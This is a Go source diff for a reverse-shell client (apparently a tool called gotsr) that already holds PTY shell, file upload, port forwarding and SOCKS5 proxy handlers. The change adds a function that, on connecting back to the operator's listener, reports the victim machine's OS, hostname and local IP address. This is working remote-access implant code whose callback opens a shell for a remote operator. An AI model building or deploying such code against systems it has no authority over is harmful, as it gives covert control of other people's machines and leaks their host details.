@@ -11,6 +11,7 @@ import (
 	"fmt"
 	"io"
 	"log"
+	"net"
 	"os"
 	"os/exec"
 	"runtime"
@@ -34,17 +35,17 @@ type ReverseClient struct {
 	currentUploadPath string
 	uploadChunks      []string
 	runningCmd        *exec.Cmd
-	ptyFile           *os.File   // PTY file for shell
-	ptyCmd            *exec.Cmd  // Command running in PTY
-	inPtyMode         bool       // Whether currently in PTY mode
-	ptyMutex          sync.Mutex // Protects PTY state
+	ptyFile           *os.File        // PTY file for shell
+	ptyCmd            *exec.Cmd       // Command running in PTY
+	inPtyMode         bool            // Whether currently in PTY mode
+	ptyMutex          sync.Mutex      // Protects PTY state
 	forwardHandler    *ForwardHandler // Port forwarding handler
 	socksHandler      *SocksHandler   // SOCKS5 proxy handler
 }
 
 var (
-	globalSessionID  string
-	sessionIDOnce    sync.Once
+	globalSessionID string
+	sessionIDOnce   sync.Once
 )
 
 // GetSessionID returns the process-wide session identifier used by this gotsr instance.
@@ -192,13 +193,47 @@ func (rc *ReverseClient) Connect() error {
 		}
 	})
 
-	// Announce session identifier to listener and log it locally
+	// Announce session identifier and optional metadata to listener and log it locally
 	id := GetSessionID()
 	log.Printf("Session ID: %s", id)
-	if _, err := rc.writer.WriteString(fmt.Sprintf("%s %s\n", protocol.CmdIdent, id)); err == nil {
+	identLine := rc.buildIdentPayload(id)
+	if _, err := rc.writer.WriteString(identLine); err == nil {
 		_ = rc.writer.Flush()
 	}
 	return nil
+}
+
+func (rc *ReverseClient) buildIdentPayload(id string) string {
+	parts := []string{protocol.CmdIdent, id}
+	if osName := runtime.GOOS; osName != "" {
+		parts = append(parts, "os="+osName)
+	}
+	if host, err := os.Hostname(); err == nil && host != "" {
+		parts = append(parts, "host="+host)
+	}
+	if ip := localIP(rc.conn); ip != "" {
+		parts = append(parts, "ip="+ip)
+	}
+	return strings.Join(parts, " ") + "\n"
+}
+
+func localIP(conn net.Conn) string {
+	if conn == nil {
+		return ""
+	}
+	localAddr := conn.LocalAddr()
+	if localAddr == nil {
+		return ""
+	}
+	addrStr := localAddr.String()
+	if addrStr == "" {
+		return ""
+	}
+	if host, _, err := net.SplitHostPort(addrStr); err == nil && host != "" {
+		return host
+	}
+	// Return just the address if no port or parsing fails
+	return addrStr
 }
 
 // IsConnected returns whether the client is currently connected
